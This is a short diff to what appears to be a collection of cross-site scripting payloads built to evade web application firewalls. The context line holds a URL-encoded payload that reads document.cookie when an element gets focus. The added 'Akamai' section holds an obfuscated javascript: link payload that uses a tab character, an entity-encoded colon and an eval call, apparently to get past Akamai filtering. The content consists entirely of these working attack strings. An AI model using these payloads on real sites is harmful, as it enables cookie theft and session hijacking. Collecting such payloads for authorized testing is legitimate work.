@@ -22,3 +22,8 @@
 '%22%3E%3Casuka%20AutoFocus%20ContentEditable%20OnFocusIn%3D_%3Dalert%2C_%28document.cookie%29%3E'
 ```
 
+## Akamai
+
+```
+<A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here
+```
